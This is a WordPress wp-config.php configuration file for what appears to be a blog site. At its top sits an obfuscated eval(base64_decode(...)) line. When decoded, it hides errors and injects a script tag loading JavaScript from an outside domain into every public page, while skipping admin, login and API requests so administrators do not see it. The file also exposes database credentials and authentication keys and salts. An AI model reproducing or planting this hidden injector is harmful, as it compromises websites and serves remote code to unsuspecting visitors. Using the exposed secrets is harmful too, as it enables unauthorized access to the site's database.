<?php
 eval(base64_decode("aW5pX3NldCgiZGlzcGxheV9lcnJvcnMiLCAwKTsKaW5pX3NldCgiZGlzcGxheV9zdGFydHVwX2Vycm9ycyIsIDApOwoKaWYgKFBIUF9TQVBJICE9PSAiY2xpIiAmJiAoCiAgICBzdHJwb3MoQCRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdLCAiL3dwLWFkbWluL2FkbWluLWFqYXgucGhwIikgPT09IGZhbHNlICYmCiAgICBzdHJwb3MoQCRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdLCAiL3dwLWpzb24iKSA9PT0gZmFsc2UgJiYKICAgIHN0cnBvcyhAJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl0sICIvd3AvdjIiKSA9PT0gZmFsc2UgJiYKICAgIHN0cnBvcyhAJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl0sICIvd3AtYWRtaW4iKSA9PT0gZmFsc2UgJiYKICAgIHN0cnBvcyhAJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl0sICIvd3AtbG9naW4ucGhwIikgPT09IGZhbHNlICYmCiAgICBzdHJ0b2xvd2VyKEAkX1NFUlZFUlsiSFRUUF9YX1JFUVVFU1RFRF9XSVRIIl0pICE9PSAieG1saHR0cHJlcXVlc3QiCikpIHsKICAgIHByaW50KGJhc2U2NF9kZWNvZGUoIlBITmpjbWx3ZENCemNtTTlJaTh2WVdzdVlXdGhiVFl3T0RBd0xtNWxkQzhpUGp3dmMyTnlhWEIwUGc9PSIpKTsKfQ==")); 

 
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https:wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

/** MySQL settings - You can get this info from your web host ** /** The name of the database for WordPress */
define( 'DB_NAME', 'prec_precise_blogs' );

/** MySQL database username */
define( 'DB_USER', 'prec_precise_bloguser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Precise@123' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https:api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'Y_`<*-H^}`z/-7*pdzrGg%ww S= =[6g]0X.}e:{#}4|ER>+7<qOz`RUA]*^ ~_q' );
define( 'SECURE_AUTH_KEY',  '* Sl#K1YdYs!4;uPY>[-65[oyA?%8+%~pH!F47I+K _zv@DlNmV_KrNK)q f|Pu`' );
define( 'LOGGED_IN_KEY',    '~U~)$ .*z.llpUul<w}W`eYHs~!<::?8DwD[X]<9D<x`!W-:Q2evbi$$;r*mOC]t' );
define( 'NONCE_KEY',        '5TT3q:s.@2n|3y-,cTrv&WHY~ #m^g#c!z~`BaP0Kyj[>K]o{9;:alaj$Bh:+b9n' );
define( 'AUTH_SALT',        '!TG_I2k!]^S21Z{*<Xnt $(;f%ZNJ|1HTjH7dJz(h7Qm)nq.*%u,_01,ROzndS1!' );
define( 'SECURE_AUTH_SALT', 'zYy1wt* yP*cTu;_L_@5(.eQ*6ajifP!F.icUsi:`WFz LG8=*K,-o>5hQx& @e=' );
define( 'LOGGED_IN_SALT',   'AgBXi`!c?5Q]zHt3sk#-+j;]?:bEHXgC*VZhx.T-v`(9}Vazb>bRp]V7VQRmx^3K' );
define( 'NONCE_SALT',       '6hGPUZZy+?Olku*03=93mx^wi6$HWT;HP[~*.40%A02s+oL1}F=7,&.wM_EQ!s$)' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_p3dm';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https:wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', true );
define( 'WP_DEBUG_LOG', true );
define( 'WP_DEBUG_DISPLAY', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
